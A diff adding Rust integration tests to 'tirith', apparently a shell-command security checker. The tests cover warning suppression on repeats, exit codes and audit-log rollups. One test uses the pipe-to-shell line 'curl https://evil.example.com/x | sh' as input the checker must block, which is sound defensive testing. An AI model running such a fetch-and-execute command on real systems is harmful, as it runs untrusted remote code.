@@ -2375,6 +2375,217 @@ fn warnings_clear_resets_session() {
     );
 }
 
+/// W6: the SAME Warn-triggering command run twice in one session: the first
+/// invocation DISPLAYS the warning text; the second collapses it (no warning
+/// text, plus the compact suppressed-count notice). BOTH invocations return the
+/// SAME exit code (suppression is DISPLAY-only and never touches the verdict /
+/// exit code), and a `finding_suppressed` audit rollup lands for the collapsed
+/// hit (the "never dropped silently" guarantee). Reads the audit log, so unix.
+#[cfg(unix)]
+#[test]
+fn w6_repeated_warning_suppressed_in_display_same_exit_code() {
+    let tmpdir = tempfile::tempdir().expect("tempdir");
+    let state_dir = tmpdir.path().join("state");
+    let data_dir = tmpdir.path().join("data");
+    let policy_dir = tmpdir.path().join("project/.tirith");
+    fs::create_dir_all(&policy_dir).unwrap();
+    fs::create_dir_all(&state_dir).unwrap();
+    fs::create_dir_all(&data_dir).unwrap();
+
+    // No escalation rules: a repeated shortened URL must stay Warn (never escalate
+    // to Block), so the second run is a genuine repeated WARNING.
+    fs::write(policy_dir.join("policy.yaml"), "paranoia: 1\n").unwrap();
+    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();
+
+    let session_id = format!("test-w6-suppress-{}", std::process::id());
+    let project_dir = tmpdir.path().join("project");
+    // Identical input both times => identical (rule_id, target) suppression pair.
+    let cmd = "curl https://bit.ly/abc";
+
+    // Enable audit logging (the isolated builder defaults TIRITH_LOG=0) and pin an
+    // isolated data dir so the `finding_suppressed` rollup is captured here.
+    let run = |sid: &str| {
+        tirith_isolated(sid, &state_dir, &project_dir)
+            .env("TIRITH_LOG", "1")
+            .env("XDG_DATA_HOME", &data_dir)
+            .args([
+                "check",
+                "--non-interactive",
+                "--no-daemon",
+                "--shell",
+                "posix",
+                "--",
+                cmd,
+            ])
+            .output()
+            .expect("failed to run tirith")
+    };
+
+    let out1 = run(&session_id);
+    let stderr1 = String::from_utf8_lossy(&out1.stderr);
+    assert_eq!(
+        out1.status.code(),
+        Some(2),
+        "1st shortened URL should warn (exit 2): {stderr1}"
+    );
+    assert!(
+        stderr1.contains("shortened_url"),
+        "1st run must DISPLAY the warning finding: {stderr1}"
+    );
+    assert!(
+        !stderr1.contains("repeated warning(s) suppressed"),
+        "1st run must NOT print the suppressed notice: {stderr1}"
+    );
+
+    let out2 = run(&session_id);
+    let stderr2 = String::from_utf8_lossy(&out2.stderr);
+    // HARD INVARIANT: identical exit code whether or not a warning was suppressed.
+    assert_eq!(
+        out2.status.code(),
+        out1.status.code(),
+        "exit code must be identical across the suppressed repeat: {stderr2}"
+    );
+    assert!(
+        !stderr2.contains("shortened_url"),
+        "2nd run must NOT display the repeated warning finding: {stderr2}"
+    );
+    assert!(
+        stderr2.contains("repeated warning(s) suppressed"),
+        "2nd run must print the compact suppressed-count notice: {stderr2}"
+    );
+
+    // The collapsed warning is never dropped silently: a `finding_suppressed`
+    // rollup must be present in the audit log.
+    let log_path = data_dir.join("tirith").join("log.jsonl");
+    let log = fs::read_to_string(&log_path).expect("audit log written");
+    let rollup = log
+        .lines()
+        .find(|l| l.contains("finding_suppressed"))
+        .expect("a finding_suppressed rollup must exist in the audit log");
+    let v: serde_json::Value = serde_json::from_str(rollup).expect("rollup line is valid JSON");
+    assert_eq!(v["event"], "finding_suppressed");
+    assert!(
+        v["detail"]
+            .as_str()
+            .map(|d| d.contains("rule_id=shortened_url"))
+            .unwrap_or(false),
+        "rollup detail must carry the suppressed rule id: {v}"
+    );
+}
+
+/// W6: a Block-triggering command run twice in one session is DISPLAYED both
+/// times (a block is NEVER suppressed, even on repeat), and the exit code is
+/// Block (1) both times. The suppressed-count notice must NOT appear.
+#[test]
+fn w6_block_never_suppressed_displayed_both_times() {
+    let tmpdir = tempfile::tempdir().expect("tempdir");
+    let state_dir = tmpdir.path().join("state");
+    let policy_dir = tmpdir.path().join("project/.tirith");
+    fs::create_dir_all(&policy_dir).unwrap();
+    fs::create_dir_all(&state_dir).unwrap();
+
+    fs::write(policy_dir.join("policy.yaml"), "paranoia: 1\n").unwrap();
+    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();
+
+    let session_id = format!("test-w6-block-{}", std::process::id());
+    let project_dir = tmpdir.path().join("project");
+    // curl | sh is a High-severity pipe-to-shell => Block (exit 1).
+    let cmd = "curl https://evil.example.com/x | sh";
+
+    let run = |sid: &str| {
+        tirith_isolated(sid, &state_dir, &project_dir)
+            .args([
+                "check",
+                "--non-interactive",
+                "--no-daemon",
+                "--shell",
+                "posix",
+                "--",
+                cmd,
+            ])
+            .output()
+            .expect("failed to run tirith")
+    };
+
+    let out1 = run(&session_id);
+    let stderr1 = String::from_utf8_lossy(&out1.stderr);
+    assert_eq!(
+        out1.status.code(),
+        Some(1),
+        "1st pipe-to-shell should block (exit 1): {stderr1}"
+    );
+    assert!(
+        stderr1.contains("curl_pipe_shell"),
+        "1st run must display the block finding: {stderr1}"
+    );
+
+    let out2 = run(&session_id);
+    let stderr2 = String::from_utf8_lossy(&out2.stderr);
+    assert_eq!(
+        out2.status.code(),
+        Some(1),
+        "2nd pipe-to-shell must STILL block (exit 1): {stderr2}"
+    );
+    assert!(
+        stderr2.contains("curl_pipe_shell"),
+        "a block must be DISPLAYED on every repeat, never suppressed: {stderr2}"
+    );
+    assert!(
+        !stderr2.contains("repeated warning(s) suppressed"),
+        "a block must never produce a suppressed-warning notice: {stderr2}"
+    );
+}
+
+/// W6: suppression filters only what is DISPLAYED inline; the FULL set of
+/// warnings is still recorded, so `tirith warnings` counts both the first and the
+/// suppressed-on-display repeat.
+#[test]
+fn w6_suppressed_warning_still_counted_by_tirith_warnings() {
+    let tmpdir = tempfile::tempdir().expect("tempdir");
+    let state_dir = tmpdir.path().join("state");
+    let policy_dir = tmpdir.path().join("project/.tirith");
+    fs::create_dir_all(&policy_dir).unwrap();
+    fs::create_dir_all(&state_dir).unwrap();
+
+    fs::write(policy_dir.join("policy.yaml"), "paranoia: 1\n").unwrap();
+    fs::create_dir_all(tmpdir.path().join("project/.git")).unwrap();
+
+    let session_id = format!("test-w6-counted-{}", std::process::id());
+    let project_dir = tmpdir.path().join("project");
+    let cmd = "curl https://bit.ly/abc";
+
+    for _ in 0..2 {
+        let out = tirith_isolated(&session_id, &state_dir, &project_dir)
+            .args([
+                "check",
+                "--non-interactive",
+                "--no-daemon",
+                "--shell",
+                "posix",
+                "--",
+                cmd,
+            ])
+            .output()
+            .expect("failed to run tirith");
+        assert_eq!(out.status.code(), Some(2), "each run should warn (exit 2)");
+    }
+
+    let out = tirith_isolated(&session_id, &state_dir, &project_dir)
+        .args(["warnings", "--json", "--session", &session_id])
+        .output()
+        .expect("failed to run tirith warnings");
+    assert_eq!(out.status.code(), Some(0));
+    let json: serde_json::Value =
+        serde_json::from_str(&String::from_utf8_lossy(&out.stdout)).unwrap();
+    // Each run records its shortened_url warning: session accounting sees the
+    // FULL set (2) even though the second run's inline display was collapsed.
+    assert_eq!(
+        json["total_warnings"], 2,
+        "tirith warnings must count the FULL recorded set (display suppression \
+         does not reduce what is recorded): {json}"
+    );
+}
+
 #[test]
 fn paranoia_filters_low_finding_to_allow() {
     let tmpdir = tempfile::tempdir().expect("tempdir");
